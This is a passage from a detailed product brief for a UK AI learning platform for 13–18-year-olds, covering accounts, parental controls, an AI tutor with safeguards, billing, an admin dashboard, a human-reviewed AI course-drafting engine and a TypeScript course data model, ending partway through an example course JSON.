# [Platform Name] — Platform Brief

> **Source of truth for the build.** A fun, project-based, self-paced AI learning studio for UK teenagers aged 13–18.
> Owner: Chris Crane · Prepared: 15 November 2026 (Europe/London) · Language: British English throughout (user-facing copy, docs, and code comments where natural).
> Placeholder brand: **[Platform Name]** — keep this exact token in code as `BRAND_NAME` so it can be swapped in one place.

This brief specifies the **launch product**. Build only what is described in the main body. A short list of **future additions** appears near the end: design the data model so those can be added later, but **do not build them now**. There are no timescales, phases or milestones.

Visual design, layout and UI are not specified here. Those decisions are yours (see the instructions at the end).

---

## 1. The idea

[Platform Name] is a UK-first online studio where teenagers (13–18) learn to use today's AI tools by **making things they actually care about**: a Snapchat-style app, an AI music video, a promo advert, a homework-helper chatbot, a streetwear drop, a football stats dashboard. Every course is a short, self-paced project that ends in a finished artefact the teen can keep, download and show off.

Young people are leaving school without being taught how to use AI in ways that will help them get work and make things, while the tools themselves change every month. This platform gives them a safe, engaging place to learn by doing.

The launch platform teaches teens to make things in **real external tools** (for example Replit, Base44, Canva, CapCut), with step-by-step account and how-to guides — it is not a coding sandbox, app host or per-tool build proxy. Every project sits in a guided course player with an **AI coach** that hints but never does the work, an ethics checkpoint, and a "Tools you'll need" section. Parents get a dashboard, consent controls, screen-time limits, and a clear approval step when a tool needs it. It is sold to **families**, and the owner gets a **super-admin dashboard** from which Chris can create, edit, update, delete and manage everything without changing code. An **AI course creation engine** (Tool Radar plus on-demand generation) drafts new courses as tools appear; drafts are reviewed, edited and tested in the real learner player, and **nothing is published without a human sign-off**.

**Vision:** every UK teenager leaves school knowing how to use AI to build, create and work — confidently, honestly and safely — with a portfolio to prove it.

**Positioning:** the project-based studio where UK teens learn to use today's AI tools by making things they actually care about — with new projects added as the tools change.

Existing options include free classroom AI literacy (Experience AI, Oak, Day of AI), school project courses (Apps for Good), paid live camps (FunTech), and informal YouTube or Udemy videos. This platform is different: teen-chosen and self-paced, sold to families, built around making things in current tools, with a private portfolio, certificates, and parent trust.

What should set it apart: fun teen-relevant projects; step-by-step setup and how-to guides plus a Tool Register; a family subscription that is **13+ only**; an AI course creation engine that finds new tools and drafts courses for human review, so the library stays current; visible freshness and last-verified dates; a private portfolio and certificates; and an owner admin dashboard that can run the whole product without code changes.

### Explicit non-goals

These are not part of the product, even later: not for under-13s; not a social network (no direct messages, public profiles, public feed, or global leaderboards of children); not a homework-completion tool; not a school management information system; no unsupervised auto-publishing of AI-written content; no ads and no selling or sharing of children's data; no real-money payments built by learners (checkouts in courses are mock); and not an in-platform IDE, sandbox, app preview, media editor or per-tool build proxy. Learners build in real external tools. The platform does not create or hold their accounts on those tools.

### Voice and copy

User-facing writing is British English, teen-friendly and confident — not childish, not school-textbook, and not packed with exclamation marks. Errors explain what happened and what to try. Coach copy nudges rather than lectures. Parent and legal copy is plain English. Marketing imagery should use teen-made-style artefacts rather than stock photos of children, and never use real children's photos without documented consent.

---

## 2. Who it's for

### Age and safety bands

Two separate concepts — keep them separate in code:

- **`safetyBand`** (drives safety policy; derived from birth month + year, recalculated daily): `teen_13_15` (strictest defaults), `teen_16_17` (still parent-linked at launch), `adult_18` (can hold their own account and pay; parent link optional). Under 13: blocked.
- **`pathway`** (drives content discovery, matched to UK school stages): `ks3` (Years 8–9, ~13–14), `ks4` (Years 10–11, ~15–16), `sixth_form` (Years 12–13, ~16–18). Default pathway is derived from age; the teen can browse others, but courses have a hard `minAge` that is enforced regardless of pathway.

### Personas

**Maya, 14, Year 9** (`teen_13_15`, `ks3`). Wants a first win quickly, hints not lectures, and a finished thing she can show friends. Needs no contact from strangers, only age-appropriate tools, filtered Coach outputs and crisis signposting.

**Josh, 17, Year 12** (`teen_16_17`, `sixth_form`). Wants real projects in real tools, plus a portfolio and certificates he can show for an apprenticeship or degree.

**Priya, 44, parent of two (14 and 16).** Wants useful skills, predictable cost, and progress without spying. Needs a clear safety explanation (including third-party tools and their age rules), one family plan, per-child controls, tool approvals, and data download or delete.

**Sam, 29, Content Editor.** Needs a structured course editor, a front-end preview that looks exactly like the learner view, a review queue for AI-drafted and hand-made courses, on-demand generation, the Tool Register and setup-guide editor, last-verified dates, tool-change alerts, and one-click take-down.

**Dee, 40, Designated Safeguarding Lead (DSL).** Needs a safeguarding case queue, restricted-access notes, escalation templates and an audit log.

**Chris, owner (`super_admin`).** Logs into the admin dashboard and runs the whole product from there: create, edit and delete everything in this brief, generate or approve AI-drafted courses, add staff later with tighter permissions, and act quickly when something is unsafe or broken.

Teachers and schools are important later (see Future additions). They are not launch users.

---

## 3. What to build at launch

The launch product is the features below — 61 in total, already merged rather than listed as many tiny items. Build these, plus the supporting technical work in later sections. Do not build the future additions.

### 3.1 Accounts

- **Under-13 block.** Anyone under 13 is stopped at sign-up. No personal data about that child is stored, only an anonymous block-event count.
- **Parent-led family account.** A parent or carer (18+) creates the family account, verifies their email, and adds child profiles with a nickname, birth month and year, and a username checked for personal information and profanity. No child email is required. The parent can set a password now or give the child a one-time invite code, valid 72 hours. Multiple children can sit on one family plan, within seat limits. An 18-year-old can hold their own account and pay themselves.
- **Teen sign-up pending parent approval.** Teenagers can start a sign-up themselves, but under-18 accounts stay locked until a parent approves. Until then the teen may watch a trailer and try the first non-AI step of one free course, but cannot use Coach, save work or earn a certificate. Unapproved accounts are deleted after 7 days, and this is explained up front.
- **Secure sign-in and password reset.** Parents sign in with email and password or a magic link; learners with username and password (including the invite-code flow). Passwords meet a minimum length and are checked against a breached-password list. Parents reset their own password by email; a teen's password is reset from the parent dashboard. Repeated failed sign-ins briefly lock the account and notify the parent. A daily job recalculates `safetyBand`; at 18 the learner is offered account independence.
- **Staff two-factor authentication.** All staff and owner admin access requires TOTP two-factor authentication. Staff sessions expire after 12 hours.
- **Roles.** A user is a learner, a parent, or a staff role. Learner and parent are exclusive on one account. Staff roles are `editor`, `reviewer`, `safety_reviewer`, `moderator`, `dsl`, `support`, `admin` and `super_admin`. Do not implement teacher or school-admin roles now; leave the role system extensible.

Age assurance is proportionate and configurable (`AGE_ASSURANCE_MODE`): a parent of a 13–15-year-old must complete a £0 card authorisation or an active paid subscription before the child can use Coach; 16–17-year-olds need parent email verification and consent. Confirm the method with legal before launch. Learner onboarding is short and skippable after interests: a generated (never photographic) avatar, at least three interest tags, accessibility preferences, and a first-project pick. Interests drive simple "Made for you" recommendations. Learners can save courses for later.

### 3.2 Learning

- **Learner home.** After sign-in, teens see courses to continue, recommendations, new and free courses, saved-for-later items, and any tool-approval notices.
- **Catalogue with search and filters.** A public marketing catalogue and a signed-in catalogue share search and filters: category, pathway, difficulty (Starter / Builder / Pro), time, tool type and free. Sort by for you, new, popular (aggregates only) and shortest.
- **Age gating and parent blocks.** A learner never sees or can open a course whose `minAge` is above their age, including via a direct link. Parent-blocked courses and categories are hidden. A course that still needs parent tool-approval cannot be started until that is resolved. Free-tier users see paid courses locked with "Ask a parent to unlock".
- **Course page.** Each course shows a trailer, what you'll make, Tools you'll need, modules and times, careers tags, an ethics note, freshness and last-verified dates, and Start, Continue or Save for later.
- **Course player.** The player presents every launch step type: video, reading, setup guide, external-tool task, upload, quiz, ethics checkpoint, reflection, checkpoint and submit. Navigation is linear by default; skip-ahead is allowed on non-submit steps, with skipped steps marked. Completion rules are enforced on the server. An enrolment is pinned to the course version the learner started. Every course requires an ethics checkpoint. There is no in-platform code editor, sandbox, app preview or media editor.
- **Autosave and resume.** Progress and notes save automatically and resume at the exact step on any device, including a typical school Chromebook. Parent daily caps are a hard stop with save; quiet hours are respected.
- **Quizzes.** Courses can include single-choice, multiple-choice, order and spot-the-problem questions, with immediate feedback, unlimited retries, no timers, and a pass mark. Before submit, learners do a rubric self-check; a "Not yet" rating does not block submit.
- **Hints and "I'm stuck".** Steps can offer tiered hints. "I'm stuck" opens Coach with the current step already in context and offers those hints first.
- **Captions and transcripts.** Every video has captions on by default and a transcript. Playback remembers position, supports variable speed and keyboard controls, does not autoplay with sound, and offers a low-data mode.

### 3.3 Tools

- **Tools you'll need.** Every course lists each external tool it uses, with name, official link, cost or free tier, minimum age under the vendor's terms, whether a parent must approve or set up the account, and a link to the setup guide. Displayed facts are read from the Tool Register at request time.
- **Step-by-step setup guides.** Every required tool has a guide covering account creation (what to click and enter), email verification, choosing the free plan, recommended privacy settings, and then how to do the project in that tool. Guides can include screenshots and show a last-verified date. A course must be completable on the free plan, or the guide must clearly state what a parent would pay. Coach must never ask for passwords, one-time codes, card details or API keys.
- **Tool Register.** The register is for **external tools learners use to build projects**. It records each tool's name, link, cost and free tier, minimum age, consent rule, under-18 policy (`allowed`, `parent_consent_required`, `parent_operated`, or `blocked`), notes, status and last-checked date. Coach and course-drafting models are not Tool Register tools. `parent_operated` may be used only when the terms are 18+ (or otherwise do not allow a teen account) **and** a reviewer has recorded that a parent-operated account is allowed. A `blocked` tool cannot be used by learners; a course that requires it cannot be published without an approved fallback. Editors can mark a guide stale when a tool changes. The AI course creation engine (Section 3.9) may create `candidate` Tool entries and draft courses; it never publishes them, and a human must complete and approve the Register fields before a course that uses the tool can go live.
- **Parent tool approval.** Where a course uses a `parent_consent_required` or `parent_operated` tool, Start is blocked until the parent has approved that tool for that course. Approval is recorded. Revocation blocks further setup steps. `parent_operated` guides are written for the parent; the teen sees "Ask a parent to set this up", not "create your own account".
- **Guide-mismatch reports.** If a learner reports that a screen does not match the guide, that report can create a guide-review task for editors.
- **Leaving-site notice.** External-tool tasks open in a new tab or the vendor's app. The player stays available so the learner can read the instructions, tick done, and ask Coach. Official links use allow-listed Tool Register URLs. When a learner follows an external link they are told they are leaving [Platform Name]. Do not iframe untrusted third-party apps or learner-built HTML on our origin.

### 3.4 Submissions

- **Evidence upload and links.** The final submit step (and any mid-course upload the course asks for) accepts the evidence types declared on the brief: link, screenshot, file and/or video. File types and sizes are limited. Links must be HTTPS and must not point at private-network addresses. **Until a specialist CSAM hash-matching provider is approved and enabled, evidence briefs must not require images or video of real people.** Learners submit a share or view link (for example an unlisted project or video link), and/or screenshots, files or video that use a provided sample image, a cartoon avatar, an object, or illustrated or generated media that does not show a real person. Media that appears to contain real people is rejected automatically and must not be accepted into the portfolio. The same rule applies to every generated or hand-made course.
- **Submission moderation.** Every submission is run through automated checks first (moderation API, link and SSRF checks, file type and size, and a check for media that appears to contain real people). A certificate cannot be issued while the required submission is pending or blocked. Human review is required only for flagged items and for a configurable random sample. An admin setting, `auto_accept_clean_submissions` (default **on** at launch, because Chris is sole staff), accepts submissions that pass automated checks. When the setting is off, every submission waits for a human. The sample rate is also configurable (default 10%). Flagged and sampled items appear in the moderation queue.
- **Private portfolio.** Each learner has a private portfolio of accepted projects, visible only to them and their linked parents. Pending items are visible to the submitter as "awaiting review". We do not host or execute the learner's app. Files we store open via short-lived signed URLs.
- **Certificates with verify link.** Completing a course with an accepted submission issues a PDF certificate showing first name or nickname (learner chooses, default nickname), course, date and a public verify link that shows no other personal data. A revoked certificate is shown as revoked.

### 3.5 AI Coach

Coach is a guardrailed in-platform tutor: it nudges, explains and asks questions, never does the project, and always identifies as an AI. It cannot log into an external tool. Coach is an **internal platform feature**, not a Tool Register tool: it is not listed in Tools you'll need, and learners do not create a Coach account. Model providers used by Coach (and by course drafting) are recorded as approved processors in AI settings, not as Tool Register entries.

- **Server-side AI proxy.** Every Coach call goes `browser → our API → policy checks → AI gateway → output checks → browser`. No client code may call a model provider directly. The platform never asks for an external tool's passwords, one-time codes or API keys.
- **Moderation and redaction.** Input and output are moderated. Detected personal data is stripped or replaced, and the learner is told. Inputs that look like a password, API key or one-time code are refused.
- **Crisis pathway.** Self-harm, abuse disclosure, exploitation, grooming or immediate danger triggers a **fixed approved script** (not model-generated text) with UK signposting: Childline 0800 1111, Samaritans 116 123, Shout (text SHOUT to 85258), and 999 if in immediate danger. A safeguarding case is created and the DSL is alerted.
- **Academic integrity.** Coach uses a hint ladder. It may show a short illustrative snippet, never the step's full solution or the finished project. It refuses to write homework, coursework, essays or exam answers, and offers to explain, plan, quiz or give feedback instead.
- **Monthly credits and spend caps.** Coach use is metered in internal credits (placeholders: 50/learner/month on Free, 200 on Family). Unused credits do not roll over. A global daily spend cap applies; at 100% a kill switch trips automatically. Non-AI steps continue. Credits are never used to pay for third-party tools.

See Section 8 for the proxy pipeline, retention and evaluation rules.

### 3.6 Parents

- **Parent dashboard.** Parents see, per child, courses in progress and completed, time this week, projects, certificates, safety notices and outstanding approvals. They can switch between children from any parent screen. Tutor transcripts are not shown to parents by default — only a count, a topics summary, and any safety notices. "What my parent can see" is explained to both parent and teen.
- **Time cap and quiet hours.** Parents can set a daily minutes cap, quiet hours, blocked categories or courses, optional approval for Pro courses, and can pause or lock the account. Pause immediately ends learner sessions.
- **Approvals inbox.** Parents approve or decline tool consents, parent-operated account confirmations, and paid-course unlock requests.
- **Data download and delete.** Parents can download a child's data (ZIP of JSON plus artefacts we hold) and request deletion, with a 14-day undo.
- **Consent management.** A consent centre holds required consents (account and learning data; Coach AI processing; use of named third-party tools) and optional ones (tutor-history retention, product-improvement analytics — both default off for 13–15). Copy is plain English and versioned. Parents are told that third-party tools have their own terms, and that content typed into them is not processed by us except what the learner submits back. Revoking a required consent pauses the account with a clear explanation.

### 3.7 Payments

- **Stripe family billing.** Plans are stored in the database and Stripe, not in code. **Free:** £0, up to 2 learners, 4 free courses, a modest Coach allowance, portfolio, certificates for free courses, and full parent controls. **Family:** placeholder £14.99/month or £119/year (founding families £9.99/month or £89/year locked for 12 months), up to 4 learners and the full catalogue. Extra seats and a 7-day trial (card required) are included. Promo codes are entered only by a parent or adult at checkout. Cancellation is through the Stripe Customer Portal. Prices are placeholders.
- **Under-18s never see payment.** Learners under 18 never see prices, checkout, invoices or promo-code entry. They use "Ask a parent to unlock".
- **Server-side entitlements.** Stripe webhooks are the source of truth for entitlements. Entitlements are checked server-side on every gated route.

### 3.8 Owner admin dashboard

Chris logs in as **`super_admin`** and can create, edit, update, delete and manage **absolutely everything** below without changing code. All staff access requires 2FA. Every change is audit-logged. Destructive actions ask for a reason and a confirm step. Safeguarding case notes remain break-glass even for the owner.

- **Owner admin dashboard.** A staff area covering operations, queues and every capability in this section. The owner can invite staff and assign narrower roles so other people can help later.
- **Course CMS.** A structured editor for courses and setup guides covering every field in the content model, with validation, versioning, front-end preview and inline editing in the real learner course page and player (hidden from the public; testable by safety band), scheduling, unpublish, and one-click take-down. The same editor is used for hand-made and AI-drafted courses. Publish approval is configurable (Section 3.9): at launch the owner can approve alone; a setting can later require a second, different reviewer. Published versions are immutable; edits create a new version. The publish service must refuse a version without the required human approval records.
- **Users and families.** Search and view users and families; add or remove children (respecting consent); reset passwords; lock, unlock, pause, ban and handle appeals. Impersonation is not allowed.
- **Plans, pricing and promo codes.** Create and edit plans, prices, seats, allowances, trials and founding offers. Issue, edit, disable and expire promo codes. Apply billing exceptions and refunds through Stripe, recorded in the dashboard.
- **Site pages, copy and email templates.** Edit marketing, legal, help and in-app copy, and every transactional email and in-app notification template. Pages and templates are versioned and previewable. Never add marketing email to under-18s.
- **Moderation queue and safeguarding cases.** A moderation queue for auto-flagged items, the review sample, user reports, and any submissions that still need a human, with configurable SLA timers and actions. The DSL (at launch, typically the owner) manages safeguarding cases; opening notes requires a reason and is logged. Safeguarding SLAs, alert channels and deputy escalation are configurable in admin, with sole-operator defaults (see Section 9). This does not replace appointing a trained DSL, a named deputy, or outsourced cover before scaling.
- **AI settings, feature toggles and site settings.** For Coach and for course drafting: model routing, credit prices, allowances, spend caps and kill switches, and provider enable/disable (only after processor approval and a recorded DPA). Drafting has its own model route, per-draft and monthly cost caps, Radar source toggles, schedules, score threshold, and the second-reviewer setting. Feature flags can be targeted by safety band, plan or family. Site settings cover brand name display, support contacts, default quiet hours, age-assurance mode, retention values, sign-up open/closed, a maintenance message, `auto_accept_clean_submissions` and the submission sample rate, moderation and safeguarding SLA targets, deputy escalation (default off until a deputy is named), and owner alert contacts (email always; SMS only if an approved provider is configured). Secrets stay in environment variables, not in the dashboard.
- **Audit log and basic analytics.** Filter and export the audit log. A basic snapshot covers learning and course quality, sign-ups, revenue, AI spend versus cap, and moderation or safeguarding volumes. No session replay on learner activity.
- **Staff roles.** The owner invites staff and assigns the roles in Section 3.1. Granting `admin`, `dsl` or `super_admin` is deliberate, confirmed and audit-logged. Permissions are checked in a single `authz` module.

The Tool Register is managed here as well (see Section 3.3). Course content, site pages, emails, plans, flags, tools, Radar sources, course ideas and settings are data, not code.

### 3.9 AI course creation engine

This is a launch feature. It drafts courses; it never publishes them. Learners never see a draft.

- **Automatic discovery (Tool Radar).** Scheduled background jobs search configurable sources (for example Product Hunt, Hacker News, AI news feeds, vendor changelogs, GitHub and Hugging Face) for new AI tools and trends. They deduplicate candidates, enrich them with quoted evidence and URLs, score them for teen relevance, safety and usefulness, check each tool's stated age terms, and automatically create a full draft course — project brief, modules, lessons, steps, setup guides, quizzes, rubric, ethics checkpoint, and a draft Tool Register entry — for tools that meet the score threshold. Frequency, sources, score threshold, and monthly draft and cost caps are configurable in admin. **Nothing is ever auto-published.**
- **On-demand course generation.** In the admin dashboard, Chris can type a subject, a new platform or tool name, or a course idea ID from the ideas backlog, and the system generates a full draft course in the same way as an automatic draft. The backlog is seeded from the supplied file `content/course-ideas.json` (175 ideas), and Chris can add or edit ideas there too.
- **Review queue.** Automatic and on-demand drafts land in the same admin review queue. Chris (or a reviewer) can Approve (publish now or schedule), Edit directly, Request edits (type instructions; the AI regenerates the whole course or selected sections and steps, keeping version history), or Decline with a reason. The review view shows sources, evidence, and anything unverified, clearly flagged.
- **Front-end preview and inline editing.** Drafts are viewed and edited exactly as they will appear to learners: rendered in the real course page and course player, in a hidden draft/preview mode that only staff can open (via a preview link). Text, steps, quizzes, guides and media can be edited inline in that front-end view. An admin can test the full course end-to-end as a learner, including each safety band, quizzes, submission and Coach, before approving. Nothing is visible to learners until it is approved and published.
- **Same content model and quality checks.** Generated courses use the same content model, validation rules and quality checklist as hand-made courses. Drafts that fail validation are flagged and cannot be published until they pass.
- **Configurable approval for AI drafts.** Two-person approval for AI-drafted courses is optional and controlled by a site setting. At launch, Chris as sole owner can approve and publish alone. The setting can later require a second, different reviewer. The publish service enforces the current setting and always refuses to publish a course with no human approval record.
- **Tool-change watching.** Background jobs watch registered tools for changes to terms, age rules, pricing, or pages cited by setup guides. On a change, affected guides are marked stale, affected courses are flagged for review, and editors get an alert. A tightening of age policy can block Start until a human has triaged it.

See Section 6.3 for how the engine works.

### 3.10 Safety, accessibility and notifications

- **UK legal basics.** The product must respect UK GDPR and the Data Protection Act, the ICO Age Appropriate Design Code (Children's code), and Online Safety Act basics. This brief is **not legal advice**; Chris must obtain specialist advice and have a DPO-function and a named, trained DSL in place before launch (at launch the owner may hold the DSL role); a named deputy or outsourced cover is required before scaling beyond a sole operator. ⚖️ The Studio launch-readiness checklist enforces this: public sign-up cannot be opened until a DSL is named, crisis scripts are approved, processors have a recorded DPA and the age-assurance mode is confirmed. Defaults: best interests of the child, high privacy, data minimisation, no dark patterns, no selling data, private by default, no learner-to-learner contact or visibility at launch.
- **Reporting on every step.** A Report control sits on every step, course, project and AI output, including "Someone is in danger" (auto-escalates to the DSL) and reports that a guide no longer matches the tool.
- **Upload checks.** Uploads are type- and size-limited and automatically checked (moderation API and file checks). Until a specialist CSAM hash-matching provider is approved and enabled, **photo or video uploads of people are disabled**: evidence briefs must not require them, and media that appears to contain real people is rejected. Human review is for flagged items and the configured sample, not for every clean submission.
- **Retention and UK data residency.** Data is stored in the UK (London region). Retention defaults are configurable and enforced by a nightly job. See Section 9.
- **No ads.** No ads inside lessons, and no advertising or marketing pixels in learner areas. Children's data is never sold or used for marketing.
- **WCAG 2.2 AA.** Every surface meets WCAG 2.2 AA: keyboard access, visible focus, captions and transcripts, screen-reader support, a real dyslexia-friendly reading mode, and persistent text size, high-contrast and reduced-motion settings. Colour is never the only cue. See Section 9.
- **Essential email and in-app notifications.** Safety notices, approval and unlock requests, take-downs or critical updates, and birthday-transition notices. Notifications are not sent to learners during parent-set quiet hours. Safety notices to parents are always immediate. No marketing email to under-18s.

The product is a **web app** (with a public marketing website in front). It must work on phones, tablets, laptops and 4 GB Chromebooks, and can be installed as a progressive web app. Do not build native iOS or Android apps now.

## 4. How people use it

**Parent-first sign-up (primary route).** Parent starts from the home page, signs up as a parent/carer (18+), verifies email, reads how safety and external tools work, chooses Free or a Family trial, adds a child (nickname, birth month and year, username; no child email), completes the consent centre, and sets a password or invite code. They land on the parent dashboard. If the birth date is under 13, show a friendly block and store nothing about the child.

**Teen-first sign-up.** A teenager enters birth month and year, picks a username, and gives a parent email. The account stays pending until the parent approves. Unapproved accounts are deleted after 7 days.

**A teen's first course.** After a short onboarding, the learner opens a course, reads Tools you'll need, asks a parent to approve the tool if required, follows the setup guide, does the work in the external tool, uses Coach if stuck, completes the ethics checkpoint and quiz, and submits a link and any allowed screenshots or files. After automated checks (and any required human review) accept the evidence, the project appears in the portfolio and a certificate is issued.

**Parent daily use.** The parent checks progress and time, deals with the approvals inbox, adjusts a time cap or quiet hours, and if needed downloads or deletes data.

**Editor publishes a course (hand-made or AI-drafted).** An editor may build a course in the CMS, or open an automatic or on-demand AI draft from the review queue. They preview and edit it in the real learner course page and player, test it end-to-end, then approve, request edits, or decline. At launch the owner can approve alone; if the second-reviewer setting is on, a different person must also approve (and a safety reviewer too if the course is safeguarding-sensitive). The course is then published or scheduled. Nothing AI-drafted goes live without that human approval. The owner can do all of this themselves.

**Radar or on-demand draft.** A scheduled job finds a new tool and drafts a course, or Chris types a subject, a tool name or a course idea ID in admin. The draft appears in the review queue, flagged as AI-drafted, with sources and any unverified claims. Chris previews it as a learner, edits or requests edits, then approves, schedules or declines it.

**Safeguarding incident.** A crisis signal or "Someone is in danger" report creates a case, alerts the DSL, and shows the learner the fixed script. The DSL records the outcome with break-glass access logged.

**Data deletion.** A parent requests deletion; after the 14-day undo, personal data is deleted or anonymised per the retention policy, and Stripe is updated as required.

---

## 5. Screens and what they must do

This is a functional inventory: what each screen is for and what the user can do. It is **not** a layout, wireframe or visual design. How these screens look is entirely your call. Every screen must work on phones, tablets, laptops and 4 GB Chromebooks, and be keyboard-accessible.

Route groups: `(marketing)`, `(auth)`, `(learner)`, `(parent)`, `(studio)` [internal admin]. Studio requires 2FA.

**Marketing (public):** `/` home; `/courses` public catalogue; `/courses/[slug]` public course trailer; `/parents` parent landing; `/pricing` plans; `/safety` safety overview; `/legal/*` privacy (adult and teen versions), terms, cookies, community code, AI use policy (teen version at reading age ~12); `/help` help centre; `/verify/[code]` certificate verification (first name/nickname, course, date only). All marketing, legal and help copy is editable in admin.

**Auth:** `/signup/parent`; `/signup/teen`; `/approve/[token]`; `/signin`; `/join/[inviteCode]`; `/reset`; `/blocked-age`.

**Learner:** `/onboarding`; `/home`; `/explore` catalogue; `/explore/[slug]` course detail (including Tools you'll need); `/learn/[slug]/[lessonId]/[stepId]` course player; `/learn/[slug]/complete`; `/portfolio` and `/portfolio/[projectId]`; `/certificates`; `/settings` (including "What my parent can see"); `/settings/reports`.

**Parent:** `/parent/onboarding`; `/parent/children/new`; `/parent/children/[id]/consent`; `/parent` dashboard; `/parent/children/[id]` child detail; `/parent/children/[id]/controls`; `/parent/billing`; `/parent/privacy`; `/parent/notices`; `/parent/settings`; `/parent/approvals`. The parent must be able to switch between children from any parent screen.

**Studio (staff, 2FA):** `/studio` overview; `/studio/courses` and `/edit`, `/preview`, `/admin` (versions, take-down); `/studio/review` and review detail (approve, edit, request edits, decline); `/studio/generate` on-demand course generation (subject, tool or platform name, or idea ID); `/studio/ideas` course ideas backlog; `/studio/radar` Radar inbox (candidates, scores, evidence, drafts); `/studio/radar/changes` tool-change alerts; `/studio/tools` Tool Register and setup guides; `/studio/assets`; `/studio/moderation` and report detail; `/studio/safeguarding` and case view (break-glass); `/studio/users` and `/studio/families/[id]`; `/studio/ai`; `/studio/analytics`; `/studio/audit`; `/studio/support`; `/studio/pages`; `/studio/emails`; `/studio/plans`; `/studio/promos`; `/studio/flags`; `/studio/settings`; `/studio/staff`. Draft courses are also opened in the **real** learner course page and course player in a hidden preview mode (staff-only preview link), with inline editing and a full end-to-end test as a learner of each safety band. The owner can use every screen; staff see only what their permissions allow.

---

## 6. Course content model

Courses are structured data, validated by Zod schemas in `src/content/schema.ts`, stored in Postgres (Section 12), and seeded from JSON files in `content/courses/*.json`.

```
Course ──< CourseVersion ──< Module ──< Lesson ──< Step
   │            ├── ProjectBrief (1)
   │            ├── Rubric (1) ──< RubricCriterion
   │            ├── Quiz (0..n) ──< QuizQuestion
   │            ├── Asset refs
   │            └── ToolRequirement (0..n) ──> Tool (Tool Register)
   └── tags: category, interests, careers, pathway(s)
```

```ts
type Difficulty = "starter" | "builder" | "pro";
type Pathway = "ks3" | "ks4" | "sixth_form";
type CourseStatus = "ai_draft" | "draft" | "in_review" | "changes_requested" | "approved" | "scheduled" | "published" | "needs_review" | "taken_down" | "retired" | "declined";
type Under18Policy = "allowed" | "parent_consent_required" | "parent_operated" | "blocked";
type StepType =
  | "video" | "read" | "setup_guide" | "external_task" | "upload"
  | "quiz" | "ethics_checkpoint" | "reflection" | "checkpoint" | "submit";

interface Course {
  id: string;
  slug: string;
  title: string;                 // ≤ 60 chars
  tagline: string;               // ≤ 120 chars
  category: string;              // one of the 24 category slugs
  interests: string[];
  difficulty: Difficulty;
  pathways: Pathway[];
  minAge: 13 | 14 | 15 | 16 | 17 | 18;
  estimatedMinutes: number;
  sessions: number;
  isFree: boolean;
  careers: string[];
  skills: string[];
  trailer: { assetId: string; posterAssetId: string; captionsAssetId: string };
  whatYouMake: string;
  ethicsNote: string;
  safeguardingSensitive: boolean;
  watchOut?: { type: "age18_tools" | "safeguarding" | "data" | "exam_integrity"; note: string };
  toolRequirements: ToolRequirement[];
  setupGuides: SetupGuide[];
  projectBrief: ProjectBrief;
  modules: Module[];
  quizzes: Quiz[];
  rubric: Rubric;
  version: string;
  lastVerifiedAt?: string;
  guidesLastVerifiedAt?: string;
}
interface ToolRequirement { toolSlug: string; purpose: string; required: boolean; fallbackToolSlug?: string }
interface SetupGuide { id: string; toolSlug: string; title: string; lastVerifiedAt: string; steps: SetupGuideStep[] }
interface SetupGuideStep {
  id: string; title: string; order: number;
  kind: "create_account" | "verify_email" | "choose_free_plan" | "privacy_settings" | "do_in_tool" | "export" | "other";
  body: string; screenshotAssetIds?: string[];
}
interface ProjectBrief {
  scenario: string; deliverables: string[]; constraints: string[]; stretchGoals: string[];
  artefactTypes: ("web_app" | "bot_config" | "video" | "audio" | "image_set" | "document" | "code_bundle" | "dataset" | "external_link")[];
  evidence: ("link" | "screenshot" | "file" | "video")[];
}
interface Module { id: string; title: string; summary: string; order: number; lessons: Lesson[] }
interface Lesson { id: string; title: string; order: number; estimatedMinutes: number; steps: Step[] }
interface Step {
  id: string; type: StepType; title: string; order: number; estimatedMinutes: number;
  body?: string; assetIds?: string[]; config?: Record<string, unknown>;
  completion: { rule: "view" | "quiz_pass" | "self_tick" | "setup_acknowledged" | "upload_approved" | "evidence_submitted" | "submit"; threshold?: number };
  coachContext?: string; hints: string[];
}
interface Quiz { id: string; title: string; passMark: number; questions: QuizQuestion[] }
interface QuizQuestion {
  id: string; kind: "single" | "multi" | "order" | "spot_the_problem"; prompt: string;
  options: { id: string; text: string; correct: boolean; feedback: string }[];
}
interface Rubric { criteria: { id: string; name: string; description: string; levels: { label: "Not yet" | "Getting there" | "Nailed it"; descriptor: string }[] }[] }
interface Asset {
  id: string; kind: "video" | "image" | "audio" | "captions_vtt" | "transcript_md" | "template_zip" | "dataset_csv" | "font" | "guide_screenshot";
  storageKey: string; licence: "owned" | "cc0" | "cc_by" | "licensed_platform_only";
  attribution?: string; altText?: string; durationSec?: number;
}
```

The Tool Register is the source of truth for a tool's display fields. Course JSON references tools only by `toolSlug`. AI-drafted courses use this same model: they are ordinary `course` / `course_version` records with an origin of `ai_radar` or `ai_on_demand` (see Section 6.3). Optional internal fields on a version include editor notes, `[VERIFY]` flags, a source candidate or idea ID, and a generation job ID — none of these are shown to learners.

**Validation (on save and on submit-for-review):** exactly one `submit` step, in the last lesson; at least one `ethics_checkpoint`; at least one `checkpoint` per module; every required tool has a setup guide covering account creation, email verification, free plan and privacy settings — or an explicit reviewed waiver; every `setup_guide` and `external_task` step names a `toolSlug` in `toolRequirements`; `external_task` steps include step-by-step instructions; a course cannot be published if a required tool is `blocked` with no approved fallback; every video has captions and a transcript; every image has `altText`; hints never contain the step's reference solution; there are no step types that run learner code, preview an app, or generate project media on our servers; until a CSAM hash-matching provider is approved and enabled, a course fails validation if its project brief, evidence list, submit or upload hints, or step copy require the learner to upload images or video of real people (including selfies, faces, or other people). Allowed evidence is a share or view link, and/or media of a provided sample image, a cartoon avatar, an object, or illustrated or generated content without real people. Generated courses must pass the same rule.

### 6.1 Example JSON — Build Your Own Snapchat-Style App

Safeguarding: **no real messaging between users**. The "chat" is with simulated friends (AI characters in the external tool, or between two tabs on the learner's own device). The course tells them not to enable real multi-user messaging or upload other people's photos. The project is built in **Replit** (fallback: **Base44**). Learners follow the setup guide, build in that tool, and submit a private project link plus screenshots of the filter working on a provided sample image, cartoon avatar or object (not a photo of a real person), and of the disappearing chat.

```json
{
  "slug": "build-your-own-snapchat-style-app",
  "title": "Build Your Own Snapchat-Style App",
  "tagline": "Build a camera app with your own filters and disappearing messages — in a real coding tool, with AI as a helper you stay in charge of.",
  "category": "apps-websites",
  "interests": ["coding", "apps", "social", "design"],
  "difficulty": "builder",
  "pathways": ["ks4", "sixth_form"],
  "minAge": 13,
  "estimatedMinutes": 175,
  "sessions": 7,
  "isFree": false,
  "careers": ["software-development", "product-design", "ux-design"],
